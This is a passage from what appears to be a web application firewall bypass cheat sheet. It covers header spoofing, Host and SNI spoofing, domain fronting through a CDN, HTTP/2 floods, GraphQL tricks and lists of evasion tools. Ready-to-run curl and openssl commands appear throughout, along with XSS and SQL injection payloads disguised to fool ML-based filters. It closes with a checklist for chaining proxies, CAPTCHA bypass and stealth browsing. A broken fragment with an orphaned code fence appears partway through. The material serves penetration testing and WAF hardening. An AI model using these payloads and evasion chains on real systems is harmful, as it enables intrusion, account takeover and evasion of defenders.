  - Adding headers that make the request appear to come from internal networks or spoof identity. Many applications, especially behind misconfigured reverse proxies, trust headers like `X-Forwarded-For` or `X-Forwarded-Host` to determine the client's IP or the requested host. Manipulating these can lead to various vulnerabilities:
    - Password Reset Poisoning: Injecting headers like `X-Forwarded-Host: attacker.com` can cause the application to generate password reset links pointing to the attacker's domain.
    - Bypassing IP Restrictions: Using `X-Forwarded-For: <trusted_ip>` or similar headers can bypass IP-based access controls if the server trusts the header.
    - Open Redirects: Manipulating host-related headers (`X-Forwarded-Host`, `Referer`) can redirect users to malicious sites.
    - SSRF: Headers like `X-Forwarded-For` or `X-Real-IP` can be manipulated to target internal IPs (e.g., `169.254.169.254` for AWS metadata service).
  - Common Headers for Spoofing/Bypass: Attackers may use a variety of headers to manipulate server behavior or bypass WAF rules. Some common examples include:
    ```
    X-Forwarded-Host: attacker.com
    X-Forwarded-For: 127.0.0.1
    X-Client-IP: 127.0.0.1
    Client-IP: 127.0.0.1
    X-Real-IP: 127.0.0.1
    X-Originating-IP: 127.0.0.1
    X-Remote-IP: 127.0.0.1
    X-Remote-Addr: 127.0.0.1
    Forwarded: for=127.0.0.1;host=attacker.com
    Referer: attacker.com
    Origin: null / attacker.com
    # And many variations like X-Forwarded, X-Forwarded-By, etc.
    ```

- **HTTP Parameter Pollution**:
  - Using multiple parameters with the same name

  ```
  ?id=safe&id=malicious
  ```

  - Mix sources (query, body, headers, cookies) to exploit precedence ambiguities across proxies/gateways.

- **HTTP RFC Inconsistencies**:
  - Exploiting differences in how servers handle HTTP specification
  - Using newline variations (CR, LF, CRLF)
  - Adding unexpected line breaks in headers

- **Host Header Spoofing**:
  - The `Host` header specifies the hostname the client wants to connect to, crucial for virtual hosting and reverse proxies.
  - If a WAF/proxy relies solely on the `Host` header for filtering, it can be bypassed by sending a legitimate `Host` header value while the actual connection (e.g., SNI in TLS, IP address) points to a blocked or different target.
  - **Mechanism**:
    1. Client connects to `evil.example.com` (e.g., IP address of `evil.example.com`).
    2. The SNI in the TLS handshake might be `evil.example.com`.
    3. The HTTP `Host` header is set to `legit.example.net` (a domain allowed by the WAF).
    4. The WAF sees `Host: legit.example.net` and may allow the request, which is then routed to `evil.example.com` by the underlying infrastructure if it uses the `Host` header for routing or if the IP was already resolved to `evil.example.com`.

  - **Example with `curl`**:

    ```bash
    # SNI will be evil.example.com (matching the URL)
    # Host header is spoofed to legit.example.net
    curl -H "Host: legit.example.net" https://evil.example.com
    ```

    ```mermaid
    sequenceDiagram
        participant Alice as Alice (Attacker)
        participant Proxy as WAF/Proxy
        participant TargetServer as evil.example.com
        participant AllowedServer as legit.example.net

        Alice->>Proxy: TLS Handshake (SNI: evil.example.com, connects to IP of evil.example.com)
        Proxy-->>TargetServer: Forwards TLS Handshake
        TargetServer-->>Proxy: TLS Handshake Response
        Proxy-->>Alice: TLS Handshake Response

        Alice->>Proxy: HTTP Request (Host: legit.example.net) [Encrypted in TLS]
        Note over Proxy: Proxy inspects Host header 'legit.example.net' (Allowed)
        Proxy->>TargetServer: HTTP Request (Host: legit.example.net)
        TargetServer->>Proxy: HTTP Response
        Proxy->>Alice: HTTP Response
    ```

  - **Applicability**:
    - Bypasses filters that only check the `Host` header.
    - Can bypass restrictions like file upload size limits if the spoofed `Host` points to a domain with fewer restrictions.
  - **Protection**:
    - WAFs should verify that the hostname in the SNI and the `Host` header are identical.
    - If they mismatch, the request should be blocked (e.g., Fortinet's "Domain Fronting Protection").
    - This check prevents the simple Host Header Spoofing described.
    - Enforce strict ALPN and certificate SAN checks; for HTTP/2 enforce `:authority` ≈ SNI.

### 15. Advanced Techniques

- **HTTP Request Manipulation**:
  - **Multiple Content-Encoding Headers**: Send multiple headers with conflicting values
    ```
    Content-Encoding: invalid
    Content-Encoding: gzip
    ```
  - **8k Bypass**: Overloading request parameters to overwhelm WAF processing
  - **Unicode Normalization Exploitation**: Using characters that normalize to malicious values
    ```
    # Using NFKD normalization forms
    unicodedata.normalize('NFKD', payload)
    ```

- **WAF Fuzzing Automation**:
  - Using tools like "Wafer" to automate WAF bypass discovery
  - Systematically testing edge cases in WAF rule processing
  - Combining multiple evasion techniques in automated sequences
  - Add feedback‑driven payload evolution (genetic algorithms) to evade ML‑based detections.

- **Advanced Encoding Techniques**:
  - **HTML Tag Encodings**: Injecting symbols at specific points
  - **Specialized DOM Events**: Triggering DOM events that bypass filtering
  - **Double Unicode Escaping**: `\u00\u0036\u0031` for character '1'
  - **MIME Smuggling**: multipart boundary tricks, mixed `Content‑Type` declarations through chained proxies.

- **IP Fragmentation Attacks**:
  - Fragment HTTP requests across multiple packets
  - WAFs may reassemble these differently than the target server
  - Beware of modern middleboxes normalizing or dropping fragments; measure viability before use.

- **Timing-Based Techniques**:
  - Leveraging WAF timeout discrepancies
  - Sending requests when WAF processing is at peak load
  - Use request coalescing and long‑lived HTTP/2 streams to alter inspection timing.

- **Machine Learning-Based Evasion**:
  - Using ML to generate payloads that evade detection
  - Adjusting payloads based on WAF feedback
  - Gradually evolving attack patterns to avoid signature detection
  - Cloudflare **AI WAF Attack Score** can be tricked by embedding payloads in lesser‑weighted features (e.g., multipart filenames)
  - Vary entropy and payload tokenization to mislead n‑gram/embedding models.

- **Browser Bugs Exploitation**:
  - Leveraging browser-specific parsing quirks
  - Using differences between how WAFs and browsers interpret content

### 16. HTTP/2, HTTP/3 & Advanced Protocol Bypasses

- **HTTP/2 `:authority` Header Bypass**:
  - HTTP/2 replaces the `Host` header with the `:authority` pseudo-header for the target URI. The `:authority` field includes the hostname and optionally the port.
  - WAFs/proxies not correctly parsing the binary and compressed HTTP/2 protocol may fail to extract or compare the `:authority` field with the SNI.
  - This can bypass domain fronting or `Host` header validation checks that rely on HTTP/1.1's `Host` header.
  - For instance, some WAFs' domain fronting protection mechanisms may only be effective for HTTP/1.1 and not for HTTP/2.
  - Example (`curl` automatically uses `:authority` for HTTP/2 when a `Host` header is provided):
    ```bash
    curl --http2 -H "Host: legit-looking-domain.com" https://actual-target-server.com/index.html
    ```

- **HTTP/3 (QUIC) Bypass**:
  - HTTP/3 operates over QUIC (UDP), which multiplexes streams and integrates TLS 1.3+.
  - If a WAF or proxy does not support or deeply inspect QUIC/HTTP/3 traffic, it cannot analyze the encrypted stream to apply policies based on HTTP content or SNI (within QUIC's TLS handshake).
  - Enterprises may block outgoing UDP to non-standard ports, but HTTP/3 typically uses 443/UDP. If allowed, it can be a bypass vector.
  - Servers can announce HTTP/3 support via the `Alt-Svc` HTTP header in responses to HTTP/1.1 or HTTP/2 requests.
  - Example (`curl`):
    ```bash
    curl --http3 https://example.net
    ```

- **HTTP/2 Rapid Reset flood** (CVE‑2023‑44487): send a burst of `RST_STREAM` frames to overwhelm back‑ends while front‑end WAFs proxy at HTTP/1.1.
- **HTTP/2 CONTINUATION Flooding** (2024 research): stress header compression/HPACK handling on middleboxes.

### 17. GraphQL‑Specific WAF Bypasses

- **Introspection & alias spamming**: use deeply nested aliases to evade depth limits.
- **Batch operations**: bundle many queries in one request to sneak payloads through superficial query‑string filters.
- **Query name tampering**: mask malicious fields behind benign names.
- **Tools**: `graphql‑cop`, `inql`, `Escape p‑cli` for automated fuzzing.
- Test batched queries with differing operation names, file upload scalars, and custom directives; many WAFs only parse shallow GraphQL.

### 18. SNI (Server Name Indication) Manipulation & Evasion

Server Name Indication (SNI) is a TLS protocol extension where the client indicates the hostname it is attempting to connect to during the TLS handshake. This is crucial for servers hosting multiple websites on a single IP address. Since the SNI is typically sent in cleartext (in the `ClientHello` message, unless Encrypted Client Hello - ECH - is used), web filters can inspect it to enforce policies.

SNI spoofing is a technique to bypass web filters that rely solely or primarily on the SNI value to allow or block requests. The attacker sends an SNI for a whitelisted domain while directing the actual traffic to a different, potentially blocked, server IP address.

**Mechanism:**

1.  The client initiates a TLS handshake, providing an SNI of an allowed domain (e.g., `allowed.example.com`) to the web filter/proxy.
2.  Simultaneously, the client directs the actual TCP connection to the IP address of the target server (e.g., `198.51.100.23` for `blocked.example.org`).
3.  The HTTP `Host` header in the subsequent (encrypted) HTTP request might also be set to the actual target server (`blocked.example.org`).

**Examples:**

- **Using `openssl`**:

  ```bash
  # Connects to IP 198.51.100.23 (blocked.example.org)
  # but presents 'allowed.example.com' as SNI
  openssl s_client -connect 198.51.100.23:443 -servername allowed.example.com
  ```

- **Using `curl`**:
  ```bash
  # Tells curl to connect to 198.51.100.23 (IP of blocked.example.org)
  # for any request to allowed.example.com.
  # The SNI will be 'allowed.example.com'.
  # The Host header is explicitly set to 'blocked.example.org'.
  curl -k --connect-to allowed.example.com::198.51.100.23 \
       -H "Host: blocked.example.org" \
       https://allowed.example.com
  ```

  - `-k`: Ignores certificate warnings (since the presented cert for `blocked.example.org` won't match `allowed.example.com`).
  - `--connect-to host1:port1:host2:port2`: Resolves `host1:port1` to `host2:port2`. Here, `allowed.example.com` (default port 443) is directed to `198.51.100.23` (default port 443 if not specified after IP).
  - `-H "Host: blocked.example.org"`: Sets the HTTP Host header for the application layer.

**Applicability & Proxy Types:**

- **Basic SNI Filters**: Effective against filters that only check the SNI value.
- **Transparent Proxies**: Can be effective as the client controls the DNS resolution (or IP choice) and the initial TLS handshake.
- **Explicit Proxies (Normal/Non-Transparent)**:
  - Can still be effective. The client can specify the target IP address in the HTTP `CONNECT` request to the proxy.
  - The client then performs the TLS handshake through the proxy, sending the spoofed SNI.
  - Example with `curl` and an explicit proxy:
    ```bash
    curl --proxy http://proxy.internal:8080 -k \
         --connect-to allowed.example.com::198.51.100.23 \
         -H "Host: blocked.example.org" \
         https://allowed.example.com
    ```
  - **Proxy Behavior Variance**: Some proxies might honor the IP in the `CONNECT` request, while others might resolve the hostname from the SNI themselves, potentially thwarting the bypass.
- **TLS Inspecting Proxies**: SNI spoofing can sometimes work even if the proxy performs TLS inspection, provided the proxy forwards the client's spoofed SNI and connects to the IP specified in the `CONNECT` request (rather than resolving the spoofed SNI).

**Limitations and Protections:**

- **SNI vs. Certificate Validation**: Advanced WAFs/filters compare the SNI with the Subject Alternative Name (SAN) or Common Name (CN) in the server's presented TLS certificate.
  - If there's a mismatch, the connection might be flagged or dropped (e.g., FortiGate's "Server certificate SNI check" set to "Strict").
- **Bypassing Certificate Checks**: To bypass this, an attacker would need to control the server certificate of the target (`blocked.example.org`) to match the spoofed SNI (`allowed.example.com`). This could involve using a self-signed certificate for `allowed.example.com` on the attacker-controlled server.
- **Certificate Chain Verification**: Filters should always validate the entire certificate chain and reject connections with untrusted certificates (e.g., self-signed ones if not explicitly trusted by the filter/client policy).

- **Omitting SNI Bypass**:
  - The SNI extension in the TLS `ClientHello` is optional according to RFC 6066.
  - Clients can omit SNI by connecting directly to the server's IP address instead of using a hostname.
  - **Mechanism**:
    1. Client establishes a TCP connection to the server's IP address.
    2. TLS handshake begins; `ClientHello` is sent without the SNI extension.
    3. The server might return a default certificate (e.g., for a generic CDN hostname), potentially causing a mismatch warning that the client might need to ignore (e.g., `curl --insecure`).
    4. The HTTP `Host` header in the encrypted request can still be set to the desired target hostname.
  - **Example (`curl`)**:
    ```bash
    # Request to IP 151.101.194.133, no SNI sent.
    # Spoofed Host header: compass-test.global.ssl.fastly.net
    curl --insecure -v -H "Host: compass-test.global.ssl.fastly.net" https://151.101.194.133/index.html
    ```
  - **Impact**: This can bypass WAFs/proxies that rely on the presence of SNI for policy enforcement or domain fronting detection (which compares SNI to `Host` header).
    - Explicit proxies might block direct IP connections in `CONNECT` requests if configured to do so.
    - Transparent proxies might be more susceptible if they only inspect SNI.

- **Encrypted Client Hello (ECH) Bypass**:
  - ECH (Encrypted Client Hello, successor to ESNI) encrypts most of the `ClientHello` message, including the SNI.
  - This prevents network intermediaries (WAFs, proxies, ISPs) from snooping on the SNI and thus determining the intended destination server.
  - If a WAF relies on SNI for filtering or routing, ECH effectively bypasses this by making the SNI unreadable.
  - **Mitigation (Defensive)**: Defenders might choose to block ECH connections or attempt to strip ECH information from DNS `HTTPS` records. However, this can break legitimate ECH-enabled clients and has privacy implications.
  - Note: ECH support is expanding in modern browsers; expect increased prevalence in 2025.

### 19. Domain Fronting

Domain fronting is a technique to bypass web filters and censorship by masking the true destination of a connection. It leverages Content Delivery Networks (CDNs) by sending a request with an SNI (Server Name Indication) of a legitimate, allowed domain, while the HTTP `Host` header specifies a different, potentially blocked, domain that is also served by the same CDN.

**Mechanism:**

1.  The client initiates a TLS handshake with a CDN, using an SNI for an allowed domain (e.g., `allowed-via-cdn.com`).
2.  The web filter sees the connection to the CDN and the allowed SNI, potentially permitting the connection.
3.  The HTTP `Host` header within the encrypted TLS connection is set to the actual target server (e.g., `blocked-target.com`).
4.  If the CDN is configured to route requests based on the `Host` header and hosts both `allowed-via-cdn.com` and `blocked-target.com` (or is configured to proxy for `blocked-target.com` via a frontable domain), it forwards the request to `blocked-target.com`.
5.  The traffic appears to be for `allowed-via-cdn.com` at the network/TLS layer, but the content is served from `blocked-target.com`.

```mermaid
sequenceDiagram
    participant Alice as Alice (Attacker)
    participant Firewall as Web Filter/Firewall
    participant CDN as CDN Server
    participant TargetServer as blocked-target.com
    participant AllowedFront as allowed-via-cdn.com (front domain)

    Alice->>Firewall: TLS Handshake (SNI: allowed-via-cdn.com, connects to CDN IP)
    Firewall->>CDN: Forwards TLS Handshake (SNI: allowed-via-cdn.com)
    Note over CDN: CDN handles TLS for allowed-via-cdn.com
    CDN-->>Firewall: TLS Handshake Response
    Firewall-->>Alice: TLS Handshake Response

    Alice->>Firewall: HTTP Request (Host: blocked-target.com) [Encrypted in TLS]
    Firewall->>CDN: Forwards Encrypted HTTP Request
    Note over CDN: CDN decrypts, sees Host: blocked-target.com
    CDN->>TargetServer: Proxies/Routes Request to blocked-target.com
    TargetServer->>CDN: HTTP Response
    CDN->>Firewall: HTTP Response [Encrypted in TLS]
    Firewall->>Alice: HTTP Response

```

**Key Points:**

- **CDN Dependency**: Relies on CDNs that route based on the `Host` header and do not strictly validate SNI against the `Host` header.
- **Legitimate SNI**: Uses a legitimate domain in the SNI, which often has a valid certificate issued by the CDN, making the initial TLS handshake appear valid.
- **Hidden Destination**: The actual destination (`Host` header) is hidden within the encrypted HTTP traffic.

**Example with `curl` and Fastly CDN:**

Fastly is a CDN known to allow domain fronting (at the time of the referenced article).

1.  **Setup Evil Server**: A server `evil.example.com` is set up.
2.  **Fastly Configuration**:
    - Create a Fastly service.
    - Set the origin to `evil.example.com`.
    - Fastly provides a domain like `your-service.global.ssl.fastly.net`. This will be used in the `Host` header.
3.  **Find a Frontable Domain**: Find a legitimate domain (e.g., `frontable.example.org`) that is also served by Fastly and shares IP infrastructure with `your-service.global.ssl.fastly.net`.
4.  **Execute Domain Fronting**:
    ```bash
    # SNI will be frontable.example.org (allowed domain on Fastly)
    # Host header is your-service.global.ssl.fastly.net (points to evil.example.com)
    curl -H "Host: your-service.global.ssl.fastly.net" https://frontable.example.org/
    ```

    - The request goes to a Fastly IP.
    - SNI is `frontable.example.org`, for which Fastly provides a valid certificate.
    - `Host` header `your-service.global.ssl.fastly.net` tells Fastly to fetch content from `evil.example.com`.

**CDNs and Domain Fronting Stance:**

- **Allowing (Historically/Potentially)**: Fastly.
- **Blocking**: AWS CloudFront, Google Cloud CDN, Azure CDN. These CDNs typically check if the SNI and `Host` header match and block requests if they don't.
- Mixed: Some vendor POPs or partner edges may behave differently; validate per‑region behavior.

**Detection and Protection:**

- **SNI/Host Header Mismatch**: WAFs and proxies can detect domain fronting by comparing the hostname in the SNI with the `Host` header in the decrypted HTTP request. If they differ, the request can be flagged or blocked.
- **TLS Inspection**: This detection requires TLS inspection capabilities.
- **Limitations**: Even with detection, sophisticated attackers might find ways to bypass these checks, for example, by finding subdomains or services on allowed CDNs that have more relaxed policies.

# 2. Adversarial Token Injection: Add noise tokens
<script>/*benign benign benign benign benign*/alert(1)</script>

# 3. Embedding Space Manipulation: Use non-ASCII lookalikes
<ѕcript>alert(1)</ѕcript>  # Cyrillic 's' characters

# AI WAFs often ignore certain request parts
POST /upload
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="<script>alert(1)</script>"

# Combine SQL injection syntax with XSS to confuse classifiers
'><script>alert(1)</script>' UNION SELECT 1--
```

**Tools:**

- `ml-waf-evasion-toolkit` (2024) - Research tool for testing ML WAF robustness
- `adversarial-payload-generator` - Generates adversarial examples against WAF classifiers

### WAF Fingerprinting Tools

- **WAFW00F** - The ultimate WAF fingerprinting tool with the largest fingerprint database
- **IdentYwaf** - A blind WAF detection tool using unique fingerprinting methods
- **Ja3er/ja4plus** - TLS fingerprint analysis and spoofing helpers

### WAF Testing Tools

- **GoTestWAF** - Tests WAF detection logic and bypasses
- **Lightbulb Framework** - Python-based WAF testing suite
- **WAFBench** - WAF performance testing suite by Microsoft
- **Framework for Testing WAFs (FTW)** - Rigorous testing framework for WAF rules
- **WAF Testing Framework** - Testing tool by Imperva
- **graphql‑cop** – Fuzzer for GraphQL APIs with WAF bypass testing
- **GoReplay/Mitmproxy** – record & replay traffic through different network paths to compare WAF decisions

### WAF Evasion Tools

- **WAFNinja** - Fuzzes and suggests bypasses for WAFs
- **WAFTester** - Tool to obfuscate payloads
- **libinjection-fuzzer** - Fuzzer for finding libinjection bypasses
- **bypass-firewalls-by-DNS-history** - Uses old DNS records to find origin servers
- **abuse-ssl-bypass-waf** - Finds supported SSL/TLS ciphers for WAF evasion
- **SQLMap Tamper Scripts** - Obfuscates SQL payloads to evade WAFs
- **Bypass WAF BurpSuite Plugin** - Adds headers to make requests appear internal
- **enumXFF** - Enumerates IPs in X-Forwarded-Headers to bypass restrictions
- **WAF Bypass Tool** - Open source tool from Nemesida
- **noble‑tls / uTLS / tls-client** – spoof browser‑grade TLS stacks programmatically

## WAF Bypass Chaining

Combine multiple techniques for more effective bypassing:

1. Use residential proxies
2. Implement a fortified headless browser
3. Add human-like behavior simulation
4. Apply CAPTCHA bypass when needed
5. Avoid honeypot traps
6. Mix multiple encoding techniques
7. Exploit request parsing inconsistencies
8. Use ML-generated payloads that evade signature detection
9. Align TLS/JA3 with real browsers and switch to HTTP/3 where inspection is weaker
10. Pivot to origin when feasible; fall back to stealth browser automation with humanization
